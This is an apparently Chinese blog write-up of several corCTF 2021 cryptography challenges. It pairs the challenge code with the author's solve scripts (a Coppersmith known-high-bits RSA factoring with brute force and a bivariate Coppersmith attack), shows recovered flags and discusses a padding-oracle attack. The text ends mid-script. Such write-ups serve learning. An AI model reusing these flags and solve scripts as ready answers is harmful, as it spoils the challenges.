<h2 id="Crypto-supercomputer"><a href="#Crypto-supercomputer" class="headerlink" title="Crypto-supercomputer"></a>Crypto-supercomputer</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">v</span>(<span class="params">p, k</span>):</span></span><br><span class="line">	ans = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> k % p == <span class="number">0</span>:</span><br><span class="line">		k /= p</span><br><span class="line">		ans += <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">p, q, r = getPrime(<span class="number">2048</span>), getPrime(<span class="number">2048</span>), getPrime(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(p, q, r)</span><br><span class="line">n = <span class="built_in">pow</span>(p, q) * r</span><br><span class="line"></span><br><span class="line">a1 = random.randint(<span class="number">0</span>, n)</span><br><span class="line">a2 = n - a1</span><br><span class="line"><span class="keyword">assert</span> a1 % p != <span class="number">0</span> <span class="keyword">and</span> a2 % p != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">t = <span class="built_in">pow</span>(a1, n) + <span class="built_in">pow</span>(a2, n)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(xor(flag, long_to_bytes(v(p, t)))))</span><br></pre></td></tr></table></figure>

<p>简单的二项式展开，展到最后把指数最小的n给除完了，a1暴露出来，由于a1不是p的倍数，所以函数v中的循环条件不满足，循环结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line">p = <span class="number">20936670545375210972091706288423179494163425035286134775773514440843943493090886819895346572945288304582498268271507942037581752184819846906869395551921930704321251130746547888224652316226957634541702883599286787839982090615950687496752999645558331533314682453610929822041558882012483238149288762974740347582024050756443700107245858419316423473568526347559377124536218894368962796664914408327949348396038507355935608178392088898784474582354438590711083089253977971653913217304360725716982473871023235180637867588860233011122300656470435644430602412710493441965130162664981423496370539240693045312454250776393871037539</span></span><br><span class="line">q = <span class="number">19872523115298089612152987731023453644084277408261276810219001288407280019889227914287760742936580023163800626696116882213533508813201232707621762739857924392306902336092739272758773377952936022982446120177174082641600741522817135305633293579042208014735900229922142564590095968054337719254632703676737069746032384348392244892496672044899073391936273280270753785076044108870166304800552404013519058026991588856235381264192387525832530187004466616791531223421070547342377071358044704265893255021275811622959301157507095984825182110574434699593886509171425701861331576642311553357835312334349976576969220483604368671153</span></span><br><span class="line">r = <span class="number">18342695102288954165224207958150786487860883752676419020596228714991017967256173183699487408637445601341687447489432163178271335469203559084363600703497940503946684342504933131623546315643648637992201226732630680112575643707020017139390225257319697353426087369722671485915571962910153169877358046375850132351117527591675467417925944135644417622440847857598273517926844822766083086147088819776687612745404553608100705862181700054385028096749375873889019995159762301115707945396140178370414857973922007665218670792403129624089144668480280115489465764431016721028424152163659378120333071194425845370101841510224643446231</span></span><br><span class="line">c = <span class="string">b&#x27;6255a505b969be8175a5c578fd6e856ecd85faa1a22fdf38d2d11851211676fd3047ed12c4027e66ed2173495877180e3d49a387b74701fbbbdce00a2248c7812b157626c95e7cf5727ee90cc9a6a98d84ee50f106b11245d65b87a27bbd7ab94b0d82eeb6e49e81249ae880c150ff87d8da701e9d317932fa2b27b64eb894a112d942d7d269478a6c120be885f3fbd065c38e70498c2f294b47bb08da09fb63c05070248079fe4311c9821dd8d3a08b15f13cdb0b7a8d406790c4796e0218851b496a11bf1ad7575be6d9999d5f1c73080d724c66a116f865ffcd3048be5d59dae55a4a063629d30429765733521702ec36d3f111b015934d15d620ad0e35ee56&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(xor(unhexlify(c), long_to_bytes(<span class="number">2</span>*q)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{1_b3t_y0u_d1dnt_4ctu411y_d0_th3_m4th_d1d_y0u?}</p>
</blockquote>
<p>其实是个变种，la佬的博客上有</p>
<h2 id="Crypto-babyrsa"><a href="#Crypto-babyrsa" class="headerlink" title="Crypto-babyrsa"></a>Crypto-babyrsa</h2><p>willwam845师傅出的题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">73542616560647877565544036788738025202939381425158737721544398356851787401183516163221837013929559568993844046804187977705376289108065126883603562904941748653607836358267359664041064708762154474786168204628181667371305788303624396903323216279110685399145476916585122917284319282272004045859138239853037072761</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct = <span class="subst">&#123;<span class="built_in">pow</span>(flag, e, n)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Transcription of image:</span></span><br><span class="line"><span class="string">735426165606478775655440367887380252029393814251587377215443983568517874011835161632</span></span><br><span class="line"><span class="string">289108065126883603562904941748653607836358267359664041064708762154474786168204628181</span></span><br><span class="line"><span class="string">9145476916585122917284319282272004045859138239853037072761</span></span><br><span class="line"><span class="string">108294440701045353595867242719660522374526250640690193563048263854806748525172379331</span></span><br><span class="line"><span class="string">341078269246532299656864881223</span></span><br><span class="line"><span class="string">679098724593514422867704492870375465007225641192338424726642090768164214390632598250</span></span><br><span class="line"><span class="string">39563231146143146482074105407</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(n, p, q)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n = 73542616560647877565544036788738025202939381425158737721544398356851787401183516163221837013929559568993844046804187977705376289108065126883603562904941748653607836358267359664041064708762154474786168204628181667371305788303624396903323216279110685399145476916585122917284319282272004045859138239853037072761</span><br><span class="line">e = 65537</span><br><span class="line">ct = 2657054880167593054409755786316190176139048369036893368834913798649283717358246457720021168590230987384201961744917278479195838455294205306264398417522071058105245210332964380113841646083317786151272874874267948107036095666198197073147087762030842808562672646078089825632314457231611278451324232095496184838</span><br><span class="line"></span><br><span class="line">Transcription of image:735426165606478775655440367887380252029393814251587377215443983568517874011835161632289108065126883603562904941748653607836358267359664041064708762154474786168204628181914547691658512291728431928227200404585913823985303707276110829444070104535359586724271966052237452625064069019356304826385480674852517237933134107826924653229965686488122367909872459351442286770449287037546500722564119233842472664209076816421439063259825039563231146143146482074105407</span><br><span class="line"></span><br><span class="line">(n, p, q)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/babyrsa.png" alt="babyrsa"></p>
<p>不愧是willwam845师傅，出的很有水平，截了discord上的一张图，利用截图截不全构造了已知p，q高位的攻击</p>
<p>和一般的CopperSmith已知p的高位攻击略不同，并没有直接给出p真正的高位，只是截取了10进制前几位，因为有n很容易就能知道<strong>p缺的十进制数的位数是41</strong>，所以要转换一下二进制才是，像图中我选中的二进制部分，这四个数都有，这才是真正的高位</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210826175750424.png" alt="image-20210826175750424"></p>
<p>这就和我们所熟悉的一样了吗</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210826181354805.png" alt="image-20210826181354805"></p>
<p>网上有一些<a href="https://www.dazhuanlan.com/gouridedouban/topics/1573757">脚本</a>，针对RSA已知p高位的，至少是p位数的$\frac{1}{2}$，还说如果位数不够需要爆破；不是很理解这个$\frac{1}{2}$，按道理来说275位应该早超多$\frac{1}{2}$位了呀，我多加了3位十六进制的爆破才出来</p>
<p>而且他这里也是至少知道576位，也是超过一半512的，不懂，评论区万能的师傅能告诉我吗？或者是和Copper格的原理有关，后续再研究</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210826184640398.png" alt="image-20210826184640398"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 21837013929559568993844046804187977705376341078269246532299656864881223</span></span><br><span class="line"><span class="comment"># 341078269246532299656864881223</span></span><br><span class="line">n = <span class="number">73542616560647877565544036788738025202939381425158737721544398356851787401183516163221837013929559568993844046804187977705376289108065126883603562904941748653607836358267359664041064708762154474786168204628181667371305788303624396903323216279110685399145476916585122917284319282272004045859138239853037072761</span></span><br><span class="line">c = <span class="number">2657054880167593054409755786316190176139048369036893368834913798649283717358246457720021168590230987384201961744917278479195838455294205306264398417522071058105245210332964380113841646083317786151272874874267948107036095666198197073147087762030842808562672646078089825632314457231611278451324232095496184838</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="comment"># 已知P的高位，最后面12位二进制，也就是3位十六进制要参与爆破，所以要用000补充</span></span><br><span class="line"><span class="comment"># fakep&gt;&gt;237&lt;&lt;237转十六进制末尾填充3个0</span></span><br><span class="line">p = <span class="number">0x67629c283d2d5acd4ae3eaf8f43757591fee1234c5aa3044b3cf2d07d5cf58c503782000</span></span><br><span class="line"><span class="comment"># P原本的位数</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要爆破的12位二进制数，为2**12==4096，表示0~4096</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4096</span>):</span><br><span class="line">	p4 = p</span><br><span class="line">	p4 = p4 + <span class="built_in">int</span>(<span class="built_in">hex</span>(i),<span class="number">16</span>)</span><br><span class="line">	kbits = pbits - p4.nbits()</span><br><span class="line">	p4 = p4 &lt;&lt; kbits</span><br><span class="line">	PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">	f = x + p4</span><br><span class="line">	roots = f.small_roots(X = <span class="number">2</span>^kbits, beta = <span class="number">0.4</span>)</span><br><span class="line">	<span class="comment"># 经过以上一些函数处理后，n和p已经被转化为10进制</span></span><br><span class="line">	<span class="keyword">if</span> roots:</span><br><span class="line">		p= p4 + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">		<span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">		q = n // p</span><br><span class="line">		<span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>corctf{1_w4s_f0rc3d_t0_wr1t3_ch4ll5_4nd_1_h4d_n0_g00d_1d345_pl5_n0_bully_;-;}</p>
</blockquote>
<h2 id="Crypto-babypad（unsolved）"><a href="#Crypto-babypad（unsolved）" class="headerlink" title="Crypto-babypad（unsolved）"></a>Crypto-babypad（unsolved）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>).read().encode()</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pt</span>):</span></span><br><span class="line">  iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">  ctr = Counter.new(<span class="number">128</span>, initial_value=bytes_to_long(iv))</span><br><span class="line">  cipher = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line">  <span class="keyword">return</span> iv + cipher.encrypt(pad(pt, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ct</span>):</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    iv = ct[:<span class="number">16</span>]</span><br><span class="line">    ct = ct[<span class="number">16</span>:]</span><br><span class="line">    ctr = Counter.new(<span class="number">128</span>, initial_value=bytes_to_long(iv))</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line">    pt = cipher.decrypt(ct)</span><br><span class="line">    unpad(pt, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  <span class="built_in">print</span>(encrypt(flag).<span class="built_in">hex</span>())</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(decrypt(<span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))))</span><br><span class="line">   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>AES的CTR模式（计数器模式），大致的加密流程如下</p>
<p><img data-src="https://wumansgy.github.io/2018/11/03/AES%E7%9A%84CTR%E6%A8%A1%E5%BC%8F%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E8%AF%A6%E8%A7%A3/2.png" alt="img"></p>
<p>解密就是将Ciphertext和Plaintext互换位置，Key和Nonce不变</p>
<p>而我们从密文看，似乎flag小于16字节，也就是在32个字符以内，所以填充之后，就只有一组；除了密文和iv，其他具体的信息我们都得不到了，只有成功解密和失败解密回显的区别，看来要爆破</p>
<p>没什么思路，不知道是从流程下手，还是有针对CTR的攻击手法，题目提示pad</p>
<p>这个pad函数很有意思，不仅将明文填充成长度为16字节的倍数，而且根据剩余多少位补充不同的字节，比如</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210827155323100.png" alt="image-20210827155323100"></p>
<p>好在CTFTIME有师傅贴了<a href="https://git.lain.faith/BLAHAJ/writeups/src/branch/writeups/2021/corctf/babypad">WP</a>，去舔一波</p>
<p>首先他说CTR模式下的AES是流密码，应该有MAC（消息验证码），显然题目中没有提供；其次关键还是在这个pad上，题目采用的是pkcs#7，然后说什么流密码不需要填充啊，填充会让流密码变得不安全啊，因为<code>unpad(ct, 16)</code>这句话，如下图所示，格式错误的在unpad时会报错</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210827162305417.png" alt="image-20210827162305417"></p>
<p>所以解密这一步就相当于一个oracle告诉我们猜测的明文pad之后是正确的还是错误的</p>
<p>差不多知道要异或来爆破，但师傅的WP看不懂，主要是<code>encrypted_data ^ wanted_plaintext ^ known_plaintext</code>，只能直接看exp了</p>
<p>发现密码的题目也可以先打本地<code>r = process([&quot;python&quot;, &quot;./server.py&quot;])</code>，exp也看不懂</p>
<p>看<a href="https://www.sebven.com/ctf/2021/08/23/corCTF2021-babypad.html">另外一位师傅的</a></p>
<p>艹，看不懂啊，最近脑子不行啊，看了好几天，理解不了</p>
<p>padding oracle attack了解一下</p>
<h2 id="Crypto-babyrand（recuring）"><a href="#Crypto-babyrand（recuring）" class="headerlink" title="Crypto-babyrand（recuring）"></a>Crypto-babyrand（recuring）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">und</span>():</span></span><br><span class="line">  p = getPrime(<span class="number">512</span>)</span><br><span class="line">  x = randrange(p)</span><br><span class="line">  a = p ^ x ^ randrange(<span class="number">2</span>**<span class="number">200</span>)</span><br><span class="line">  b = p ^ x ^ randrange(<span class="number">2</span>**<span class="number">200</span>)</span><br><span class="line">  <span class="keyword">return</span> p, a, b, x</span><br><span class="line"></span><br><span class="line">p,a,b,x = und()</span><br><span class="line"></span><br><span class="line">iv = urandom(<span class="number">16</span>)</span><br><span class="line">key = sha256(long_to_bytes(a) + long_to_bytes(b)).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;(x*a + b) % p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;iv = &#x27;<span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct = &#x27;<span class="subst">&#123;cipher.encrypt(pad(flag, <span class="number">16</span>)).<span class="built_in">hex</span>()&#125;</span>&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>已知，注意这里是异或，不然后面不对</p>
<p><code>a = p ^ x ^ r1</code></p>
<p><code>b = p ^ x ^ r2</code></p>
<p><code>c2 = ax + b</code></p>
<p>思路比较简单，最后肯定是要算出a和b的</p>
<p>这里知道a和b的高312位，然后也知道关于a和b的一个二元一次方程，可以试试看<a href="https://blog.csdn.net/m0_49109277/article/details/119841141?spm=1001.2014.3001.5501">之前遇到的Copper解二元方程</a></p>
<p>竟然不行？</p>
<p>没有一丁点儿思路，去翻别的师傅的WP，在一位<a href="https://blog.y011d4.com/20210823-corctf-writeup/">日本师傅的博客</a>上找到</p>
<p>首先思路没错，就是用CopperSmith，<strong>CopperSmith yyds</strong>，但是那个函数的一个参数设置有问题，所以这次放一下<a href="https://github.com/defund/coppersmith">github仓库地址</a>，上面有<strong>单变量、双变量、三变量</strong>以及两个我不是很清楚为什么会在这儿的：<strong>boneh_durfee</strong>和<strong>approximate_factor</strong>的例子</p>
<p>参数设置如下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906164057386.png" alt="image-20210906164057386"></p>
<p>上面的案例我打印出来看了下</p>
<p><code>f</code>显然是多项式；</p>
<p><code>bounds</code>是变量的界限，也就是以<code>2^bits</code>的形式，作者说了这是为了优化格子的，所以不用特别的精确；</p>
<p><code>m</code>确定要使用的<code>f</code>和<code>N</code>的高次幂，我的理解是这个多项式中最大值大约是模数的多少倍，但感觉有点不对；</p>
<p><code>d</code>确定要使用多少个可变移位。所以这里起码<code>d=2</code>吧</p>
<p>但关于m和d，有一些和案例代码里的对不上，有清楚的师傅能不能ddw</p>
<p>这里之所以第一次没有出来，就是因为<code>roots = small_roots(f, (2^200, 2^200), m=3)[0]</code>，正确的应该至少是<code>roots = small_roots(f, (2^200, 2^200), m=1, d=2)[0]</code>。而且<code>m=1, d=2</code>是最快的，几乎一下就出来了，日本师傅的<code>m=3, d=4</code>要过一会，应该也是一个不要求特别严格的值吧</p>
<p>完整的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">load(<span class="string">&#x27;coppersmith.sage&#x27;</span>)</span><br><span class="line">c1 = <span class="number">5365904711205493895182988721055598679508066289977091231731349423996531384326997250984304389796311073201846992254794801346573036775490182780952712232258774</span></span><br><span class="line">c2 = <span class="number">2351499357088933835557969576916974229915931074692169825269157710226395480997304497294813272746195475744137017453323338362896396977337638862808560417575150</span></span><br><span class="line">p = <span class="number">12118911800929768381158064532151564397584328623097191996086479213117076586014730135201334840794700976422626122702191630484231703678287738839516304757792517</span></span><br><span class="line">iv = <span class="string">&#x27;eacdfb3c2cd33a8ce71dbd9a11be89ad&#x27;</span></span><br><span class="line">ct = <span class="string">&#x27;ed36d8614dd35af75251496eef0bb76582dfb83cde59715df41150054be51ac15aaee8eb540a7dbbe58a6fae8287bd9e69043a4800a1e36055d415fd3f41735d3673b3dd5fbdd21941c48ac24ef9b1e288a8848c94e85cd1bda569d2a87c8f33bc790d9aaf97eed583d35a84cc75655cba591d3da9fa3c6e681a2727f2786ffccab3866006cda27d355d8d0665a88a24815b0133a2ff2c8541bc636ac2cc97e03b6189227d3b5469f736ce7373789809de794f987cfe437be56dbb32444055e23023ccd900934ed853ceb3cbac58775a3b7b1c9f3c5a0a32f273ae30ab8a8a9bf24585c39041c262820343eef64735636450dd8628f8a830e109ae3b2b05bef150c98a417b6632ca00c96ee544853955dc948d28dfff28071c5182656fa2ae56614207b9cd96b40cbe28e20bac396577272d341b86ff242daa904e67f226180a02cd2197f8dafda1dd325437e36e457802cefb692bcf0fe9a38addf1d493bd2d40bb972ceff8337fa81a7b9a29ebc6959617a6370b97b90ef8df90e0ea780a0aaea3affa6d7be74118328ca8e3eb060a5afce6f07487ad841382ee82018ba3f452b7f1a0968606739380572364fdfb3a8dac1ca8f856b4aaafbe9c45ad1f81c30f41606e8228ca59482c191af4ecb4f426863dbdbaf76e97a7f5867647e77837dc1b3c843e1a182cf9463f2215afae0d84f975da68d508ca05117de5f5f21a3d818e45cb7612ab052a36edbd7a2386e26777f597c524be57aad5ad254f8b6caa1cc8182d84e8d5a36ea9c5528f4152edb7ce4b5e58529787862a1e9736b2ab135b914835a72fced8485f736a0d7f18bf3d923c66b4c0acede868a3b3970b322675c85dbaf92b985d47bee0ffc18a7a2827dcf449d304d11fb9265d6367e55891f006ab3313a3df6da8c46f6f736b91f31c9c90b782af9a3a527c25f608a0e2ed62d019839587b647b05697c83f3ffafc10d545c8dfc7516e284ab572cd8216b7dcda698eb979f1cd23ba757bc865b51adb337b61bbb682a52fad42741f559a77d863b2ef8af02a8f7776819b02c9b10123c999f626bb563372e9ff141dbc4ac619c52f5a0e245f873b6cadc324e2ed62c6f1858beb8988cfdeb1fa1b223cd1b2ae295c032aa58b46d12c6ace4515561bfb8276ea4b6536aec2b42cfbb64eb30f39d3e79d220da29cd46bd1c8cca85f6c11a8c1b2c265099d51d10651444eea0bbbb556a8de4bf0df8cf9904f4dc7f7840f82a7b4101b7ff499d6f619555c906ce7381c7fe4f165330d76cda4e36ff421a402b1b8bcfcbbc5c80c71ccc9814996723ba4f30f52537bf99547af16bf51bcc6795f7f2cbbf67b0cd0d8d432ff77d17758af8e6309915f152cab18c56495a0b82bdbeb96386a44bb761ee3da3c262d6eb69ee03cc5acbbac45dda3b75a863508bbab3aac1ec8371c1b62753d9a1931c2e8285295902edec528384264c4ccc2d0f9073eae44b81355b82df39f142d3fc5df63e668ea9c6375bea7ee9685830ae39a64ad30af300b4e56fe10b8cd0b0e03488828af68e6fa03f05bc8c38d12c9025e35767f22d67668d081e9827dbe2cfa6ad29d7d7e5bc88135fad55550406226c0c71f16dc901211475e35b8ad97827ee1d0dc3c015b326f884dd3dd8792864a093f73b68169f206606225c85c28af07cd27e35d6b738307629ef71160ac7717f42f0ad26a5f0ddb0aa8940fc72fd054efffe96bb2b5d3d2c68939b256650f9c3db146b69c0a5749b130424a069a2d75b0df890b86c00af1704dbb3f891dea94c152406c1fa636fce8e96db8e4db3f1f4ba2634fd9344664b788b4289acadb0bc543b65018572503d34227ab3ffbce86247cb740dca70c73c85ac29aa646b760314acd0838f0048728cedec961711c2c7f339ea816411cb87ffbc13a7a3e533505df4ac45357b7e002979496343647e33f6d5becfc3c02e357985708f817ea39b9db2cee18af34fe0f93662120e5c496bce6d39f9fc46ef6817f4183227391d73f815cfdbc3a1c58b554b4407a7dfada42945dff9d5f500b8ba588f20f6db575754bada30049a234ea503147cbaf4de8c72f451bd1c47a51d87f9bebf9e738a631863e01ffe7f32e2b620a17ec373acab84eaa0f02a7656a2d39a405c43e770b46c990230b921d9a1e6c38b45ed14011216a41880149eb2392ed7c8e88568f0bcf0e406f91b9ef98adb59bfc45504b6766074058005c059d1422cf7c343fdc88195977e106b42fcf41e95743ced2a670371013ac4cc86e412d7ee9692e0beb540198ab2661fbeebb38be431811f4ab129eb406fa4d6ab2904848941798ab042b0a05622099cf8244045dc4e0006ed30ada599e2f32cc2e474ed836176e7f5e26488295179b67aca112246d63c7a17a86a087087f39c0abce7fbeed200be9daa6cf638685c3feeb5ec265a3f8fd8ae5ad1f86fc08750b636860b1b8bdc309c31da8278f28e7e3326791998f2e74b88da31ad1090156b182b2d11a1fff2dc43a238b1b103519124ed8db6407525d9da8e3773e7652e4b11978ec0d7df57832d96970ec790a11883428a585d6650f13f37c90679aead37055351fd7852472a19bc5d9df2841fada9fbefd432ea15c548924e477642a04c93b681e1326469aa8919262517cee53657134d9effc3bf68752f7ebfb87862cf34e585b1baacbe73062764915d5d6db44a386473ea07cc13d42260aae8919720ccae0e80e09decec61c5c741fd255b5e789734d9a7b86a2500c9b50c009f6b4b96d832a9ddc1695efeb21a7de77b61eadaa4406e0ae58facd6d6b5f4b4b736a335046dadab07d23b4c171270f2e3f0c29154c2dcd10085999106301069f292402a0fc3d0ba19677b921bd70e7bbc501e7bec663dee6aaa2f6cf62cfa3ee268d57721dfb71ff95301514d404e38b67c2753aa4ab4e4be9949fa495c1fc61143b4c4563021bacbb051bdf9419cddaf0e0015655a46fb53a4c7452a0f15ae9fa45cd8bdfab768456912f6cba7ad066ca493714db1abd1625c3d6971264143fe4ef2513e4c4b6f229272271edb8998ad0a9c3e0ed41a792c22b75c6a4c87d37f7b0aa600fb903857453ee137d880e09882535e8e51d719f5ca83d0fa01d71b5115c9190ae95eaafed8a272f9abd5e040aad5042bfbf7399a6f7f2f6932e9ce8ddb856663c6177864cdae1a7d116bb258de586e621b399e870f3909acdbbcbe4fa6f9f2fcb605ed250e11f43fc3c8645ed980d94a5d3a14aab60ba5725a363f845566f170eede27a65a0a2a30865c22aa7d5cafe0ea3252645b8086f3a5443bb8c869990446ddb34e73b99d1d6cb8cdc9c69b94d20785ffde8ad38f92319d56e90a4569d235581656f6f2df761fb792833b4e72207e157841bcc99b3860abfb37f76dd77615420988e1702751e11aa5579e9f1987f3519bfb0fcf835d63b825f9128db50c8c1eccc88a64b4df432c72654371154884c54abc2c5b31693de5265c685dc7e0eeb10bcdca698bfb75016b1dfec2ece20ec4951fd338775d239db1663f63b328d6c6a0415f35f23cffae21a9db195118f22083c5fcbd7192cfa611748cb79486ab78b16b0f1b8d5e81410b0213ff6f603dec71909c6b07bf12618551e4f9c8eaf7346c890b4c10c02970011242a9c57933cdff2526985c0009341474f7d18d197558585feca1cb0030afc784906b45bef19d4cc32b0ae289a08a3eadad86e512100dde8a85d8ab9cc5740cd2e58848b56b7f07defeb43d28aaa6e5a7e46a221323a928088743845b6dc669868634117a50759e5f144f35297374f79e6059a159ca0596fb26273a219fcdc9e5c56a2b9efa0fe392cf54b0c&#x27;</span></span><br><span class="line"></span><br><span class="line">x = c1</span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv)</span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(ct)</span><br><span class="line"></span><br><span class="line">bar = (p ^^ x) &gt;&gt; <span class="number">200</span> &lt;&lt; <span class="number">200</span></span><br><span 